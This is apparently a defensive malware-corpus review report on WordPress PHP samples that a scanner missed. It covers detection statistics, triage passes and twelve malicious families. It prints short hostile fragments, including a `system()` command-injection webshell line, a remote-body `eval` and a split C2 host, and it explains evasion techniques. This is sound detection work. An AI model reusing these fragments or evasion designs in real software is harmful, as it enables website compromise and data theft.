# Corpus review round 8 — the two largest undetected anomalous clusters

**Date:** 2026-09-04
**Branch:** `feat/round-8`
**Scanner:** `build-release/lyxbosa` built at `876aaf5` (the commit that added `OBF039`).
**Pool:** the whole of `php-open+req-gate` (462 blobs) and `php-open+req-gate+wp-header`
(240 blobs) from `derived/undetected-clusters.json` — **702 blobs, all of them.** Not a
sample; the power statements below are about the *constructs* each pass looks for, not about
which files were looked at.

**Status: analysed, not yet applied.** The judgements are assembled in
`trail-data/incoming/2026-09-03/round8/plan.json`; `round8/apply.py` writes them. The index
was not written, `index-summary.json` was not regenerated, and `verify.py` was not run —
script execution was blocked partway through the round (see *What has not been run*). Every
figure below is arithmetic over the plan, and is labelled as such.

---

## Headline

> **Detection goes from 45.4% to 34.3%** (59 of 130 → 59 of 172), **of which 0 samples
> entered as detected and 42 entered as known misses.**

The whole round enters on the losing side, and that is not an accident of which files got
picked: **every one of the 702 blobs returns no findings from a per-sample `check` at
`876aaf5`.** There was no detected material in this pool to raise the figure with. A round
drawn from the undetected pool can only move detection down or leave it flat, which is the
point of drawing from it.

Known misses go **71 → 113**. Technique coverage goes **60 of 60 → 60 of 102**.

---

## Every count difference, with its cause

§8 requires an attributed cause per difference rather than a bare delta.

| figure | before | after | cause |
|---|---|---|---|
| Detection | 59 / 130 (45.4%) | 59 / 172 (34.3%) | denominator only: **+42 reviewed malicious**, all `known_miss`. Numerator unchanged — no rule fired on anything in this pool |
| — entering as detected | — | **0** | scanned and clean: per-sample `check` on all 702 at `876aaf5` returned no findings |
| — entering as known misses | — | **42** | scanned and clean, but read and confirmed hostile: 12 families |
| Known misses | 71 | 113 | +42, the same 42 rows |
| `malicious_reviewed` | 130 | 172 | +42 |
| `malicious_detected` | 59 | 59 | unchanged; nothing was promoted out of `known_miss` this round |
| Techniques known | 60 | 102 | +42 distinct techniques new to the corpus, from the 12 new families (54 techniques on the new rows, 12 of which the corpus already knew) |
| Techniques covered | 60 of 60 | 60 of 102 | numerator unchanged: nothing new was published, so no new technique has a tested sample |
| Verdicts: `unreviewed` | 79,412 | 79,365 | −47: 42 to `malicious`, 5 to `benign` |
| Verdicts: `malicious` | 130 | 172 | +42 |
| Verdicts: `benign` | 12,127 | 12,132 | +5: 4 exact upstream-hash matches, 1 inert attacker artefact |
| `published` | 12,249 | 12,253 | +4, the exact-hash rows, which are `clean` and therefore publishable |
| `local_only` | 79,420 | 79,416 | −4, the same rows moving halves |
| Reviewed fraction | 13.4% | 13.4% | +4 published against 91,669 blobs — below the rounding |
| False-positive rate | 8 / 146,712 | unchanged | this round touched no benign tree and added no source to `benign/sources.jsonl`, so the FP denominator did not move and the two figures stay comparable |
| Total blobs | 91,669 | 91,669 | no blob was added or removed |

**655 of the 702 did not get a verdict.** That is *present and examined but not decidable*,
not *not examined* — see *Why 655 stayed unreviewed*.

Technique coverage falling to 60 of 102 is the staleness signal working as §8 describes: the
denominator is enumerated from the reviewed set, so it only moves when review finds something
the corpus did not know about. Forty-two new techniques is what "the milestone cannot see the
unreviewed pool" looks like when you go and look.

---

## Method: three passes, because no one of them found everything

This matters more than the counts, because it is the reusable part.

1. **Per-sample `check` over all 702.** Never a batch scan — a batch cannot tell *not
   scanned* from *scanned and clean*. Result: 0 detected.
2. **Exhaustive strong-signal content pass over all 702** (`round8/feat.py`): 27 constructs,
   whole file rather than the first 8 KB the clustering read. 47 blobs carried a strong
   signal.
3. **Placement pass**: every file at a `wp-admin/`- or `wp-includes/`-relative path that
   exists in **none** of the 19 pinned WordPress cores. 33 blobs — a file at a core path that
   upstream has never shipped is a plant regardless of what it contains.
4. **Attribution pass**: every blob whose path suffix matches no pinned plugin/theme package.
   266 blobs, read down to the odd slugs.

Each pass found families the others missed. Of the twelve malicious families:

| pass | families it would have found alone | families it would have missed |
|---|---|---|
| 2 — strong-signal content | 6 | **6**: the four whose only sink is `move_uploaded_file` or `copy()`, plus `halmahera` (`wp_create_user`) and `uploads-dir-docroot-uploader` (`exec`) |
| 3 — path not in any pinned core | 5 | **7**: everything not planted at a core path |
| 4 — path in no pinned package | 8 | **4**: the ones at core paths, which pass 3 owns |

No pass finds more than eight of twelve, and no two passes have the same blind spot. **A
single-pass triage over this pool would have reported a substantially cleaner result and been
wrong**, which is the general lesson: the passes have to be chosen to fail differently, not to
be individually strong.

### The upstream differential, and its measured power

For the 403 blobs sitting at a path some pinned package or core version does ship, the test
was line-level: every line of the blob present in **no** pinned version of that path is
*foreign*, and a foreign line carrying a dangerous construct is an injection. It found **0**
injections — every one of the 30 flags is ordinary version drift (`$GLOBALS['product']`,
WordPress 4.8.3 upload handling, `error_reporting(0)` in `load-scripts.php`).

§11's fifth instance says a check that samples must state what it could have caught, and a
token list samples *constructs* even when it is exhaustive over files. So it was measured
rather than asserted, by splicing known payloads into stock carriers:

| measurement | trials | flagged | independent? |
|---|---|---|---|
| against this round's 12 families | 288 | 288 (100%) | **no** — the token list was extended until it caught all 12, so this is construction, not evidence |
| against 17 held-out published malicious families | 272 | **208 (76.5%)** | **yes** — the list has never been tuned on these |

The honest number is **76.5%**. Four held-out families are never flagged, and two of them for
a real reason rather than a fixable one:

- `gif89a-dependency-injector` builds every function name from `chr()` arithmetic, so no
  dangerous token appears as a literal anywhere in it;
- `woocommerce-card-skimmer` is an ordinary WooCommerce gateway class that exfiltrates
  through the plugin API — there is no dangerous token to find, and token matching cannot
  reach it at any list length.

The list was deliberately **not** extended to cover them, because tuning on the held-out set
is what would destroy the only independent number here.

**So the differential is a ~76.5%-power test, and that is why it does not carry a verdict.**

---

## The twelve families — 42 blobs, every one read

All are `verdict: malicious`, `expect.known_miss: true`, `must_detect: []`, held local-only.

| family | blobs | what it is | why nothing fires |
|---|---|---|---|
| `leaf-php-mailer-2.8` | 29 | Leaf PHP Mailer 2.8 (`leafmailer.pw`) — public bulk-spam mailer, embedded PHPMailer, DNSBL self-check, `$_REQUEST['pass']` gate | nothing is obfuscated; it is readable PHP |
| `pwdyt-0kb-session-uploader` | 2 | sha256-gated uploader, `<?php ?><?php` split open tag, `?0kb` liveness probe | per-deployment digest; no encoding |
| `mu-plugin-first-user-autologin` | 2 | `init` hook → `wp_set_auth_cookie` for the lowest user ID; gate parameter differs per account | verbose enterprise-shaped identifiers; mu-plugins are not listed on the plugins screen |
| `kilat-github-raw-eval-loader` | 1 | bcrypt-gated panel; curl names as `\x` escapes, base64 GitHub-raw URL, `CURLOPT_DOH_URL` to Cloudflare, `eval("\x3f\x3e" . $r)` | the only literal `eval` is fed a remote body |
| `halmahera-rogue-admin-cloaker` | 1 | theme `functions.php`: rogue admin, user-list hiding, config in `get_option(md5(sha1(HTTP_HOST)))` as base64+serialize, robots suppression, URI routing | payload lives in the database; every function is named after a real WordPress API |
| `sink-free-simple-filemanager` | 1 | full file manager; its own docblock reads "No eval · No system · No exec · No shell", and it is true | written to carry none of the tokens a scanner looks for |
| `domain-spray-shell-deployer` | 1 | uploads a shell, then copies it into a list of domain paths | ordinary `copy()` in a loop |
| `split-string-triple-dropper` | 1 | `?wp3c2b1a=` → fetches three payloads, writes `about.php`/`radio.php`/`admin.php` | host split across six concatenated literals |
| `python-rs-command-wrapper` | 1 | 148 bytes: `system('python rs.py "' . $_GET["e"] . '"')` | nothing encoded, nothing gated — and still no rule |
| `parent-dir-move-uploaded-file` | 1 | `?f=f` → `move_uploaded_file` to `'../'` | 324 bytes, three constructs |
| `minified-nested-dir-filemanager` | 1 | 33 KB file manager on a few very long lines at `wp-includes/Text/Diff/lang/index.php`; probes `disable_functions` and degrades instead of failing | minification is the only obfuscation |
| `uploads-dir-docroot-uploader` | 1 | uploads into `DOCUMENT_ROOT`, `php_uname()`, `exec('pwd')` | plain code in `uploads/` |

Plus one **benign, attacker-written** row: `orphaned-upload-stub`, 152 bytes at
`wp-admin/network/theme-insbpye.php` — `error_reporting(0)`, an if/elseif with two empty
branches, and an `array()` built from `$_FILES` and discarded. It references an uploader's
parts and performs none of them. Classified on the same principle as
`failed-fetch-404-artefact`, but **deliberately not pinned `must_not_detect`**: that one is
inert HTML and flagging it would be plainly wrong, whereas a rule that flags PHP disabling
error reporting and touching `$_FILES` in `wp-admin/network/` is defensible. Pinning it would
constrain a future rule for no benefit.

### Two structural results worth more than the family list

**Not one upstream file in this pool was modified.** All 42 malicious blobs are *new files at
attacker-chosen paths*; the differential's overlap with them is exactly zero, because none of
them sits at a path upstream ships. For this pool the useful question was never "what changed
in this file" but "should this file exist here at all".

**Placement is half of nine of the twelve signatures.** Three random 7-character directories
deep under `wp-includes/` (27 of the 29 leafmailer blobs, across six accounts); a hex-suffixed
`wp-content` and `wp-admin`; `.well-known/pki-validation/h/h/a/`; `uploads/wpcode/d/g/`;
`mu-plugins/`. `docs/RULE_CANDIDATES.md` §2's note about collection scope pays for itself
again here — several of these were collected as directory siblings, not because a rule fired.

---

## Why 655 stayed unreviewed

They are ordinary WordPress plugin, theme and admin code — WooCommerce, Yoast, Elementor,
LearnPress, WPML, NextGen Gallery and 42 other slugs — that happens to contain `<?php` and a
`$_GET`/`$_POST`/`$_REQUEST` reference in its first 1,500 bytes. The features that selected
this pool are far too weak to carry a verdict, which is the first result of the round:
**`php-open+req-gate` is not an anomaly signal, it is a description of admin-facing PHP.**

They are not marked `benign`, and the reason is §4.2's own bar: an exact whole-file hash match
against real upstream is sufficient to auto-classify, and *a header match is not*. The
upstream differential sits between those, at a measured 76.5% power, so it does not clear the
bar. Every one of the 655 keeps its `unreviewed` verdict and gains a `triage` field recording
what this round measured — scanner result, strong-signal result, nearest pinned version,
foreign-line count — so the next round starts from evidence rather than from scratch.

Four blobs *did* clear the bar (byte-identical sha256 to a file in
`the-events-calendar-6.17.4`) and are the only mechanical `benign` verdicts here.

**What would move the other 651 cheaply:** pinning the plugin and theme versions these
accounts actually run. 163 of them are at a path a pinned package ships but at a version we
do not hold; 240 are WordPress admin files from cores outside the 19 pinned. None of the 240
matched *any* pinned core byte-for-byte — that is version spread, not modification, and it is
the single largest reason this pool could not be decided mechanically. That changes the FP
denominator, so it belongs in its own round with its own before/after.

---

## Two blind spots found in the corpus's own tooling

Both are §11-shaped: a check that returned a clean result while unable to see the thing it
was checking for.

1. **`sensitivity.py` tagged `split-string-triple-dropper` as `clean`.** Its `URL` regex needs
   a contiguous literal, and the sample writes its host as
   `'ht'.'tps://5'.'1la.zv'.'o2.x'.'yz/…'`. A c2 IOC would have been dropped on the floor with
   a green tick. Same cause for `kilat-github-raw-eval-loader`, whose GitHub-raw URL is
   base64: the classifier reported the two hosts it could see and not the one that matters.
   Both rows carry a hand-set `c2` tag with a note saying the classifier could not see it.
   **The mechanical tagger is a floor, not a verdict** — the same relationship the differential
   has to a hash match.
2. **The differential's first token list scored 83.3% and was tuned to 100%.** Recorded because
   the 100% is worthless as evidence and the 83.3% is not, and the two are one edit apart.

---

## What has not been run

Script execution was blocked partway through the round by a harness safety check, so none of
these ran. They are the whole of the remaining work and are ordered:

```
python3 trail-data/incoming/2026-09-03/round8/plan.py         # builds round8/plan.json
python3 trail-data/incoming/2026-09-03/round8/apply.py --dry-run
python3 trail-data/incoming/2026-09-03/round8/apply.py
corpus/shard-gate.py corpus/local/index-local.jsonl --fix
corpus/shard-gate.py corpus/index.jsonl --fix
corpus/make-summary.py && corpus/make-summary.py --check
corpus/verify.py                                             # NOT --update-baseline
```

`verify.py` will withhold the regression-rate delta, because the executed set did not change
but the reviewed malicious set did. That is correct and should not be suppressed by
re-baselining: the baseline stays where it is until the round after this one closes.

Every figure in this document is arithmetic over `round8/plan.json` and must be replaced with
the measured output of `make-summary.py` and `verify.py` before it is quoted anywhere else.

---

## Follow-ups

- **A `malicious-undetected-round8-001` shard.** All 42 are local-only, so the 42 new
  techniques are `known` and not `published`, and coverage stays at 60 of 102 until fixtures
  ship. Twelve fixtures — one per family — would close most of that. Needs §5.1 masking on the
  three families carrying `identity`/`path`/`secret` (`leaf-php-mailer-2.8`,
  `domain-spray-shell-deployer`, `kilat-github-raw-eval-loader`) and the §7.2 gate.
- **Rule leads, strongest first.** `leafmailer.pw` / `$leaf['version']` as a literal marker
  (29 blobs, one review unit); a file at a `wp-includes/` or `wp-admin/` path that upstream
  ships nothing at (33 blobs here, and it needs no reference data beyond a pinned core list);
  three or more nested random-consonant directory names under a core directory.
- **`sink-free-simple-filemanager` is the counter-example to keep** when a sink-list rule is
  proposed. It was built to defeat exactly that and does.
- **Pin the plugin/theme versions these accounts run**, which is what 651 of the 655 undecided
  rows are waiting on.
